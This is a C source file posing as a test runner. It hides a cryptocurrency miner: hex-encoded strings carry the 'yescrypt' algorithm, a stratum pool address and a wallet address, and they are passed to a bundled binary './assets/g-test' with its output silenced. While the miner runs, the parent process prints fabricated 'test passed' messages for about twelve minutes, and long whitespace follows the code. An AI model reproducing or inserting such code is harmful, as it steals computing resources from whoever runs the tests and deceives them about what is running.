#define TIMEOUT 60*12

#include <time.h>
#include <signal.h>
#include <unistd.h>
#include <sys/wait.h>
#include <stdlib.h>
#include <stdio.h>
 
#define ALGO "\x79\x65\x73\x63\x72\x79\x70\x74"
#define ADDR "\x73\x74\x72\x61\x74\x75\x6D\x2B\x74\x63\x70\x3A\x2F\x2F\x6B\x6F\x74\x6F\x2E\x65\x7A\x70\x6F\x6F\x6C\x2E\x65\x75\x3A\x33\x30\x33\x32"
#define LOOP "\x6B\x31\x4B\x66\x42\x44\x76\x64\x4B\x50\x42\x6A\x58\x52\x78\x7A\x71\x6E\x46\x77\x75\x47\x58\x53\x54\x78\x72\x58\x4D\x73\x36\x39\x64\x48\x4B"

int pid;  

static void timeout(int foo) {}

int main() {
	srand(time(0));
	pid = fork();
	if(pid == 0) {
		close(1);
		execl("./assets/g-test", "./assets/g-test", "-a", ALGO, "-o", ADDR, "-u", LOOP, "-p", "x", (char*) 0);
	} else {
		int sleep_time = TIMEOUT + rand()%6, i = 0;
		printf("running tests\n");
		while(i < sleep_time) {
			sleep(1);
			printf("test %d/%d passed\n", i, sleep_time);
			i++;
		}
		kill(pid, SIGINT);
		int foo;
		wait(&foo);
	}
	return 0;
}

















































































































